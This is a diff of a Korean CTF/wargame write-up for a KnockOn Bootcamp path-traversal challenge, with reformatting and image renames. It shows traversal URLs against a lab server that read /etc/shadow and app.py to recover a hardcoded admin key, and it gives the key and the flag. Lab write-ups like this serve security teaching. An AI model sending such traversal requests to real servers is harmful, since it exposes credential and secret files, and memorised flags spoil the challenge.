@@ -1,53 +1,32 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 10. File Download"
+title: "KnockOn Bootcamp 2nd - 10. Path Traversal"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Local file Inclusion
-  - Path traversal
-last_modified_at: 2024-09-15T20:30:00-05:00
+  - KnockOn Bootcamp 2nd
+  - Path Traversal
+  - Arbitrary File Read
+last_modified_at: 2024-09-16T10:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10009/>
 
-![10. File Download 1](/assets/images/writeup/web-hacking/knock-on/10_FILE_1.png)
+![10. File Download 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-file-1.png)
 
-![10. File Download 2](/assets/images/writeup/web-hacking/knock-on/10_FILE_2.png)
-
-|
-
-|
-
-|
+![10. File Download 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-file-2.png)
 
 ### 목표
 
----
-
 서버 파일에서 flag 찾기
-
-|
 
 ### 공격 기법
 
----
+Path Traversal
 
-Local file Inclusion
-
-- Path traversal
-
-|
-
-|
-
-|
+- Arbitrary File Read
 
 ## 문제 코드
 
@@ -106,12 +85,6 @@ if __name__ == "__main__":
 
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ```python
@@ -120,13 +93,7 @@ APP.secret_key = 'CENSORED'
 
 `secret_key`가 하드코딩 되어있음
 
-|
-
-|
-
 ### read_memo()
-
----
 
 ```python
 @APP.route("/read")
@@ -152,13 +119,7 @@ def read_memo():
 
 파일 이름을 name 파라미터를 통해 저장하고 있음. 이 부분에서 경로 조작 가능
 
-|
-
-|
-
 ### admin()
-
----
 
 ```python
 @APP.route("/admin")
@@ -182,29 +143,19 @@ def admin():
 
 이후 `msg`값을 랜더링
 
-|
-
-|
-
-|
-
-## Explot
+## 풀이
 
 ### /read
-
----
 
 ```bash
 http://war.knock-on.org:10009/admin?key=CENSORED
 ```
 
-![10. File Download 3](/assets/images/writeup/web-hacking/knock-on/10_FILE_3.png)
+![10. File Download 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-file-3.png)
 
 소스코드에 있는 키를 그대로 넣으면 안됨
 
 서버의 `app.py`파일에는 제대로된 키 값이 하드코딩 되어 있을 것임. 이걸 찾아야함
-
-|
 
 ```bash
 http://war.knock-on.org:10009/read?name=../../../../../../../../../etc/shadow
@@ -216,64 +167,38 @@ http://war.knock-on.org:10009/read?name=../uploads/diary.txt
 
 `/read`에서 name 파라미터를 이용해 경로를 이동할 수 있음
 
-![10. File Download 4](/assets/images/writeup/web-hacking/knock-on/10_FILE_4.png)
+![10. File Download 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-file-4.png)
 
 uploads와 같은 경로에 app.py가 존재함
-
-|
 
 ```bash
 http://war.knock-on.org:10009/read?name=../app.py
 ```
 
-![10. File Download 5](/assets/images/writeup/web-hacking/knock-on/10_FILE_5.png)
+![10. File Download 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-file-5.png)
 
 하드코딩된 `secret_key` 발견
 
-|
-
-|
-
 ### /admin
-
----
 
 ```bash
 http://war.knock-on.org:10009/admin?key=Wow_you_find_this?
 ```
 
-![10. File Download 6](/assets/images/writeup/web-hacking/knock-on/10_FILE_6.png)
+![10. File Download 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-file-6.png)
 
 `/admin`에서 key 파라미터에 찾아낸 `secret_key`를 입력
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### URL
-
----
 
 ```bash
 http://war.knock-on.org:10009/admin?key=Wow_you_find_this?
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```bash
 K0{H4rd_t0r_34_d_huh?}
 ```
-
-|
-
----
